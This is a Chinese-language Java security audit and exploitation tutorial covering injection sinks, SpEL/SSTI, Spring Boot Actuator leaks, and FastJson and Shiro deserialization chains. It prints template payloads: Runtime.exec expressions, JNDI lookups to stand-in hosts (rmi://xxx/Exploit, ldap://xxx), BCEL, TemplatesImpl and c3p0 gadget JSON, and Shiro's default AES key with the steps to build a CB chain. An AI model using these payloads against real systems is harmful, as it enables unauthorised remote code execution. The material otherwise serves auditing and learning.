@@ -1,0 +1,324 @@
+引言
+
+Java作为企业级应用开发的主流语言，其生态体系庞大且复杂，安全漏洞也呈现出多样化、深层次的特点。从传统的SQL注入、XXE到框架特有的SPEL表达式注入、反序列化利用，Java安全攻防一直是研究者和攻击者关注的焦点。本文将结合理论与实践，系统梳理Java应用中常见的漏洞类型，深入分析其原理、审计方法及利用技巧，并重点剖析反序列化漏洞（特别是FastJson与Shiro）的利用链构造，最后总结代码审计的Sink点与实用工具链。
+
+---
+
+一、常规漏洞篇
+
+1. SQL注入
+
+SQL注入是Web应用最古老的漏洞之一，在Java中主要与数据库交互方式相关。
+
+审计点与安全写法
+
+· JDBC
+  · 危险写法：Statement拼接SQL字符串。
+  · 安全写法：PreparedStatement占位符预编译。注意：即使使用PreparedStatement，若直接拼接SQL语句（如"select * from user where id="+id）依然存在注入。
+  · JDBCTemplate（Spring封装）若使用拼接语句同样危险，推荐使用占位符。
+· MyBatis
+  · #{}预编译，安全；${}直接拼接，危险。
+  · 典型注入场景：
+    · order by：order by ${sortColumn}（因为#{}会带引号导致语法错误）。
+    · like：'%${q}%'应改为'%'||#{q}||'%'或使用concat。
+    · in：id in (${ids})应使用<foreach>遍历。
+· Hibernate/JPA
+  · 使用位置参数（?）或命名参数（:name）预编译。
+  · 警惕HQL拼接，Hibernate的createQuery若直接拼接也是危险的。
+
+白盒审计思路
+
+1. 确定应用使用的持久层技术（JDBC/MyBatis/Hibernate/JPA）。
+2. 搜索关键方法（如executeQuery、selectList、createQuery）。
+3. 检查参数传递方式：是否使用占位符/预编译，还是直接拼接。
+
+2. XXE注入
+
+XML外部实体注入发生在XML解析器处理外部实体时，可导致文件读取、SSRF或RCE。
+
+审计函数列表
+
+需要关注以下类的parse方法，若传入的XML可控且未禁用外部实体，则存在风险：
+
+· javax.xml.parsers.DocumentBuilder
+· javax.xml.parsers.SAXParser
+· org.xml.sax.XMLReader
+· org.dom4j.io.SAXReader
+· javax.xml.stream.XMLStreamReader
+· org.jdom2.input.SAXBuilder
+· javax.xml.transform.TransformerFactory
+· javax.xml.validation.SchemaFactory
+· javax.xml.bind.Unmarshaller
+· javax.xml.xpath.XPathExpression
+
+防御措施：设置setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)等禁用DTD。
+
+3. RCE（命令执行）
+
+Java中执行系统命令的常见类：
+
+· java.lang.Runtime.exec()
+· java.lang.ProcessBuilder
+· java.lang.ProcessImpl（底层实现）
+· groovy.lang.GroovyShell（若可注入Groovy代码）
+
+审计时需追踪用户输入是否传入这些方法的参数，并注意是否有过滤绕过（如黑名单、转义）。
+
+4. SSRF（服务端请求伪造）
+
+SSRF常由java.net.URL类发起请求导致，需审计用户可控的URL参数。常见触发点：
+
+· 直接new URL(userInput).openConnection()
+· 框架中的重定向（如Spring的ModelAndView、sendRedirect）
+
+5. 其他常规漏洞
+
+· XSS、CSRF、文件上传/下载、业务逻辑漏洞等，与其他语言类似，本文不再赘述。
+
+---
+
+二、框架特定漏洞篇
+
+1. SSTI（模板注入）
+
+模板引擎将用户输入作为模板内容解析时，可能注入恶意表达式。
+
+常见引擎与利用
+
+· Thymeleaf：${...}表达式执行Spring EL，可构造${T(java.lang.Runtime).getRuntime().exec('calc')}。
+· Velocity：#set指令注入，如#set($x='')后调用$x.getClass().forName('java.lang.Runtime')。
+· Freemarker：<#assign>变量赋值，结合?new()创建对象。
+
+参考：更多语言模板注入可查阅bmjoker的文章。
+
+2. SPEL（Spring表达式注入）
+
+Spring Expression Language常用于注解（如@Value）、XML配置或SpelExpressionParser解析。若用户输入直接传入parseExpression，可导致RCE。
+
+```java
+SpelExpressionParser parser = new SpelExpressionParser();
+String exp = "T(java.lang.Runtime).getRuntime().exec('calc')";
+parser.parseExpression(exp).getValue();  // 危险
+```
+
+防御：避免用户控制表达式，或使用SimpleEvaluationContext限制权限。
+
+3. Swagger API接口泄露
+
+Swagger配置不当可能导致API接口文档暴露，攻击者可获取所有端点信息进行攻击。
+
+发现与利用
+
+· 扫描常见路径：/swagger-ui.html、/v2/api-docs、/swagger-resources。
+· 导入Swagger JSON到工具（如Apifox）批量测试接口，寻找未授权访问、参数注入等漏洞。
+
+4. SpringBoot框架安全
+
+框架识别
+
+通过图标（绿色树叶）、响应头（X-Application-Context）或404页面判断。
+
+Actuator端点泄露
+
+SpringBoot Actuator提供了监控和管理接口，若未加权限控制，可导致敏感信息泄露。
+
+· 常见端点：/actuator、/actuator/health、/actuator/env、/actuator/heapdump等。
+· Heapdump利用：下载heapdump文件，使用工具提取敏感信息（如数据库密码、AK/SK）。
+  · JDumpSpider
+  · heapdump_tool
+  · JDumpSpiderGUI
+· 其他端点：/druid（Druid监控）、/jolokia（JMX over HTTP）也可能存在利用点（如jolokia调用MBean执行命令）。
+
+---
+
+三、反序列化漏洞深度剖析
+
+反序列化漏洞是Java安全的重中之重，分为原生反序列化和三方组件反序列化。
+
+1. 原生反序列化
+
+Java对象序列化以ac ed 00 05（十六进制）或rO0AB（Base64）为特征。
+
+关键类与方法
+
+· java.io.ObjectInputStream.readObject()
+· java.beans.XMLDecoder.readObject()（XML格式）
+· org.yaml.snakeyaml.Yaml.load()（YAML格式）
+
+审计时需搜索这些方法，若反序列化的数据用户可控，则可利用反序列化链执行代码。
+
+2. 三方组件反序列化
+
+常见组件及审计点
+
+组件 漏洞触发方法 历史漏洞查询
+Log4j logger.error/info 阿里云漏洞库
+Shiro CookieRememberMeManager（rememberMe cookie） Shiro漏洞
+Jackson ObjectMapper.readValue() Jackson漏洞
+XStream fromXML() XStream漏洞
+FastJson JSON.parse()/parseObject() FastJson漏洞
+
+黑盒识别
+
+· Shiro：Cookie中包含rememberMe=deleteMe字段。
+· FastJson：请求头Content-Type: application/json，响应中可能返回@type字段或报错信息。
+· Log4j：输入${jndi:ldap://xxx}观察DNS请求。
+
+3. JNDI注入与高版本绕过
+
+JNDI（Java命名和目录接口）支持RMI、LDAP等协议，是反序列化漏洞的重要利用方式（如FastJson JdbcRowSetImpl链）。
+
+JDK版本限制演进
+
+· JDK 6u45/7u21之后：java.rmi.server.useCodebaseOnly默认为true，禁止RMI远程加载类。
+· JDK 6u141/7u131/8u121之后：新增com.sun.jndi.rmi.object.trustURLCodebase，默认为false，禁止RMI远程codebase。
+· JDK 6u211/7u201/8u191之后：新增com.sun.jndi.ldap.object.trustURLCodebase，默认为false，禁止LDAP远程codebase。
+
+高版本绕过思路
+
+1. 本地工厂类：利用本地CLASSPATH中的类作为Reference工厂类，如org.apache.naming.factory.BeanFactory配合ELProcessor执行命令。
+2. 反序列化链：LDAP返回javaSerializedData属性，触发本地Gadget反序列化（如CommonsCollections）。
+3. 利用中间件/依赖包：如Tomcat的org.apache.naming.factory.BeanFactory、Spring的org.springframework.transaction.jta.JtaTransactionManager等。
+
+工具推荐
+
+· JYso：支持多种JNDI注入方式。
+· JNDIMap
+· JNDIBypass
+· java-chains：生成各种链的payload。
+· JNDI-Injection-Exploit-Plus
+
+4. FastJson反序列化各版本利用链分析
+
+FastJson是使用最广的JSON库之一，其autotype机制曾引发多个高危漏洞。
+
+基础用法
+
+· 序列化：JSON.toJSONString(obj)
+· 反序列化：JSON.parse(str)、JSON.parseObject(str, clazz)
+
+安全特性
+
+· parseObject默认会调用setter和getter，parse默认只调用setter（但@type指定类后可触发更多）。
+· 关键点：@type指定类名，触发该类的构造方法、setter、getter。
+
+历史版本利用链
+
+版本 可用链 备注
+1.2.24 JdbcRowSetImpl JNDI注入 无需开启autotype，直接利用
+1.2.47 缓存机制绕过 利用java.lang.Class将恶意类缓存，后续可加载
+1.2.62-1.2.80 依赖包链（如TemplatesImpl、BCEL） 需开启autotype，或利用本地依赖
+
+黑盒测试思路
+
+1. 确定目标使用FastJson（通过报错信息、响应头等）。
+2. 发送测试payload：{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xxx/Exploit","autoCommit":true}，观察是否触发JNDI请求。
+3. 若不出网，尝试不出网利用链（见下）。
+
+不出网利用链
+
+· BCEL链（Tomcat/Spring环境）：利用org.apache.tomcat.dbcp.dbcp2.BasicDataSource，通过driverClassName指定BCEL字节码。
+  ```json
+  {
+    "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+    "driverClassLoader": {
+        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+    },
+    "driverClassName": "$$BCEL$$$l$8b$..."
+  }
+  ```
+· TemplatesImpl链：需开启Feature.SupportNonPublicField（或特定版本）。
+  ```json
+  {
+    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+    "_bytecodes": ["base64字节码"],
+    "_name": "a.b",
+    "_tfactory": {},
+    "_outputProperties": {}
+  }
+  ```
+· c3p0链：利用com.mchange.v2.c3p0.WrapperConnectionPoolDataSource的userOverridesAsString属性触发JNDI或反序列化。
+  ```json
+  {
+    "@type": "java.lang.Class",
+    "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
+  },
+  "f": {
+    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
+    "userOverridesAsString": "HexAsciiSerializedMap:;ACED0005..."
+  }
+  ```
+
+5. Shiro反序列化链分析
+
+Shiro的RememberMe功能是反序列化漏洞的重灾区（Shiro-550）。
+
+漏洞原理
+
+1. 获取Cookie中rememberMe的值。
+2. Base64解码。
+3. AES解密（默认密钥硬编码：kPH+bIxk5D2deZiIxcaaaA==）。
+4. 反序列化（ObjectInputStream.readObject()）。
+
+因此，攻击者只需用默认密钥加密恶意序列化对象，即可触发反序列化。
+
+利用链选择
+
+Shiro依赖的CC（CommonsCollections）版本不定，通用方案是使用CB链（CommonsBeanutils），它仅依赖Java标准库和commons-beanutils（常与shiro同包）。
+
+CB链构造分析
+
+· 入口点：PriorityQueue.readObject()
+· 调用链：
+  1. PriorityQueue.readObject -> heapify() -> siftDown() -> siftDownUsingComparator() -> comparator.compare()
+  2. comparator为BeanComparator，其compare方法调用PropertyUtils.getProperty(o1, property)
+  3. 若o1为TemplatesImpl对象，property设为"outputProperties"，则触发TemplatesImpl.getOutputProperties()，进而调用newTransformer()实现动态类加载。
+· 必要条件：
+  · PriorityQueue的size>=2。
+  · BeanComparator的property不为空。
+  · 存在TemplatesImpl对象，其_bytecodes、_name等字段设置好。
+
+利用步骤
+
+1. 生成包含恶意字节码的TemplatesImpl对象。
+2. 创建BeanComparator（property="outputProperties"）。
+3. 构建PriorityQueue，插入两个元素（第一个为TemplatesImpl，第二个任意），并设置comparator。
+4. 序列化PriorityQueue，用Shiro默认AES密钥加密并Base64编码。
+5. 作为rememberMe cookie发送。
+
+工具可使用ysoserial的CommonsBeanutils1链（需注意JDK版本兼容性）。
+
+---
+
+四、审计方法论与工具推荐
+
+代码审计Sink点总结
+
+漏洞类型 审计函数/类
+SQL注入 Statement.executeQuery, MyBatis ${}, HQL拼接
+XXE DocumentBuilder.parse, SAXReader.read等
+RCE Runtime.exec, ProcessBuilder, GroovyShell.eval
+SSRF URL.openConnection, 重定向方法
+JNDI注入 InitialContext.lookup
+原生反序列化 ObjectInputStream.readObject, XMLDecoder.readObject, Yaml.load
+三方反序列化 JSON.parse, ObjectMapper.readValue, XStream.fromXML, Shiro CookieRememberMeManager, Log4j logger.error
+
+实用工具链
+
+· 综合工具：Yakit（集成各种漏洞检测与利用模块）。
+· 反序列化利用：
+  · ysoserial：生成各类Gadget。
+  · JYso：支持JNDI注入、反序列化。
+  · java-chains：可视化生成payload。
+· JNDI注入：见上文工具列表。
+· 信息泄露：JDumpSpider系列、SBSCAN（SpringBoot扫描）。
+· 靶场练习：
+  · JavaSec
+  · JavaSecLab
+  · Hello-Java-Sec
+
+---
+
+结语
+
+Java安全攻防是一个持续演进的领域，从最初的SQL注入到如今复杂的反序列化链、JNDI绕过，攻击手法不断升级，防御者也需要深入理解底层原理和利用细节。本文覆盖了Java应用的主要攻击面，并深入剖析了FastJson和Shiro两大典型组件的利用链。实际攻防中，还需结合具体环境灵活变通，不断学习新出现的Gadget和绕过技术。希望本文能为读者在Java安全审计与漏洞研究方面提供一些启发。
